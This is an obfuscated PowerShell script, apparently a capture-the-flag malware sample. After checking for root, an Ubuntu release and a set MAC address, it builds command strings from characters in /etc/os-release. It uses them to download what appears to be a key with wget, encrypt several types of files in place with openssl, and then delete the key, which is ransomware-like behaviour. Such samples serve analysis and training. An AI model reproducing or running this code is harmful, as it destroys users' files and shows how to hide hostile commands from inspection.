function func_name_0 
{
    func_name_2
    func_name_3
    func_name_4
    func_name_5
    funct_name_1

    exit
}

function func_name_2 
{
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit} #verifies that the user is root
    if (-not ((&(Get-Command /???/?at) /etc/*release*) | grep noble)){exit} #verifies that there is a release file for linux version
    if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit} # intentional guard in chal to prevent accidentally running the script
}

function func_name_3
{
    $splitted_release_str = (&(Get-Command /???/?at) /etc/*release*).split('\n')
    $some_str_0 = ($splitted_release_str[0] += $splitted_release_str[1].split('=')[0] += $splitted_release_str[2] += $splitted_release_str[3].split('=')[0] += $splitted_release_str[4].split('=')[0] += $splitted_release_str[5] += $splitted_release_str[6].split('=')[0] += $splitted_release_str[7].split('=')[0] += $splitted_release_str[8] += $splitted_release_str[9] += $splitted_release_str[10] += $splitted_release_str[11] += $splitted_release_str[12] += $splitted_release_str[13] += $splitted_release_str[14] += $splitted_release_str[15] += $splitted_release_str[16]).Tochararray() + 0..9
    $some_str_0 = (-join ($some_str_0 | sort-object | get-unique))
    $Global:charSet = $some_str_0 #builds a charset of the letters it need to create the differnt calls 
}

function func_name_4 
{
    $some_str_1 = $GLOBAL:charSet[3] + $GLOBAL:charSet[5] + $GLOBAL:charSet[12] + $GLOBAL:charSet[8] + $GLOBAL:charSet[7] + $GLOBAL:charSet[12] + $GLOBAL:charSet[1] + $GLOBAL:charSet[6] + $GLOBAL:charSet[5] + $GLOBAL:charSet[12] + $GLOBAL:charSet[6] + $GLOBAL:charSet[5] + $GLOBAL:charSet[14] + $GLOBAL:charSet[3] + $GLOBAL:charSet[1] + $GLOBAL:charSet[3] + $GLOBAL:charSet[3] + $GLOBAL:charSet[7] + $GLOBAL:charSet[13] + 'k' + $GLOBAL:charSet[41] + $GLOBAL:charSet[56]
    $some_str_2 = $GLOBAL:charSet[16]
    &(Get-Command /???/?ge?) $some_str_1 -q -O $some_str_2
}

function func_name_5
{
    foreach ($some_str_3 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + $GLOBAL:charSet[40] + ' ' + $GLOBAL:charSet[13] + $GLOBAL:charSet[48] + $GLOBAL:charSet[49] + $GLOBAL:charSet[52] + $GLOBAL:charSet[13] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[52] + $GLOBAL:charSet[56] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:charSet[48] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + $GLOBAL:charSet[45] + ' ' + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[37] + $GLOBAL:charSet[41] + $GLOBAL:charSet[51] + $GLOBAL:charSet[11] + $GLOBAL:charSet[2] + $GLOBAL:charSet[5] + $GLOBAL:charSet[6] + $GLOBAL:charSet[11] + $GLOBAL:charSet[39] + $GLOBAL:charSet[38] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[49] + $GLOBAL:charSet[37] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + ' ' + 'f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[45] + $GLOBAL:charSet[41] + $GLOBAL:charSet[14] + 'k' + $GLOBAL:charSet[41] + $GLOBAL:charSet[56] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + ' ' + " $some_str_3 " + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[48] + $GLOBAL:charSet[53] + $GLOBAL:charSet[52] + ' ' + " $some_str_3 ")
    } 

    foreach ($some_str_3 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + $GLOBAL:charSet[40] + ' ' + $GLOBAL:charSet[13] + $GLOBAL:charSet[43] + $GLOBAL:charSet[48] + $GLOBAL:charSet[46] + $GLOBAL:charSet[41] + $GLOBAL:charSet[13] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[52] + $GLOBAL:charSet[56] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:charSet[48] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + $GLOBAL:charSet[45] + ' ' + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[37] + $GLOBAL:charSet[41] + $GLOBAL:charSet[51] + $GLOBAL:charSet[11] + $GLOBAL:charSet[2] + $GLOBAL:charSet[5] + $GLOBAL:charSet[6] + $GLOBAL:charSet[11] + $GLOBAL:charSet[39] + $GLOBAL:charSet[38] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[49] + $GLOBAL:charSet[37] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + ' ' + 'f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[45] + $GLOBAL:charSet[41] + $GLOBAL:charSet[14] + 'k' + $GLOBAL:charSet[41] + $GLOBAL:charSet[56] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + ' ' + " $some_str_3 " + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[48] + $GLOBAL:charSet[53] + $GLOBAL:charSet[52] + ' ' + " $some_str_3 ")
    } 

    foreach ($some_str_3 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + $GLOBAL:charSet[40] + ' ' + $GLOBAL:charSet[13] + $GLOBAL:charSet[41] + $GLOBAL:charSet[52] + $GLOBAL:charSet[39] + $GLOBAL:charSet[13] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[52] + $GLOBAL:charSet[56] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + ' ' + 'f' )))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:charSet[48] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + $GLOBAL:charSet[45] + ' ' + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[37] + $GLOBAL:charSet[41] + $GLOBAL:charSet[51] + $GLOBAL:charSet[11] + $GLOBAL:charSet[2] + $GLOBAL:charSet[5] + $GLOBAL:charSet[6] + $GLOBAL:charSet[11] + $GLOBAL:charSet[39] + $GLOBAL:charSet[38] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[49] + $GLOBAL:charSet[37] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + ' ' + 'f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[45] + $GLOBAL:charSet[41] + $GLOBAL:charSet[14] + 'k' + $GLOBAL:charSet[41] + $GLOBAL:charSet[56] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + ' ' + " $some_str_3 " + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[48] + $GLOBAL:charSet[53] + $GLOBAL:charSet[52] + ' ' + " $some_str_3 ")
    } 

    foreach ($some_str_3 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + $GLOBAL:charSet[40] + ' ' + $GLOBAL:charSet[13] + $GLOBAL:charSet[54] + $GLOBAL:charSet[37] + $GLOBAL:charSet[50] + $GLOBAL:charSet[13] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[52] + $GLOBAL:charSet[56] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:charSet[48] + $GLOBAL:charSet[49] + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + $GLOBAL:charSet[45] + ' ' + $GLOBAL:charSet[41] + $GLOBAL:charSet[47] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[37] + $GLOBAL:charSet[41] + $GLOBAL:charSet[51] + $GLOBAL:charSet[11] + $GLOBAL:charSet[2] + $GLOBAL:charSet[5] + $GLOBAL:charSet[6] + $GLOBAL:charSet[11] + $GLOBAL:charSet[39] + $GLOBAL:charSet[38] + $GLOBAL:charSet[39] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[49] + $GLOBAL:charSet[37] + $GLOBAL:charSet[51] + $GLOBAL:charSet[51] + ' ' + 'f' + $GLOBAL:charSet[44] + $GLOBAL:charSet[45] + $GLOBAL:charSet[41] + $GLOBAL:charSet[14] + 'k' + $GLOBAL:charSet[41] + $GLOBAL:charSet[56] + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[44] + $GLOBAL:charSet[47] + ' ' + " $some_str_3 " + ' ' + $GLOBAL:charSet[11] + $GLOBAL:charSet[48] + $GLOBAL:charSet[53] + $GLOBAL:charSet[52] + ' ' + " $some_str_3 ")
    }
}

function funct_name_1
{
    &(Get-Command R?m???-I???) $GLOBAL:charSet[16]
}


func_name_0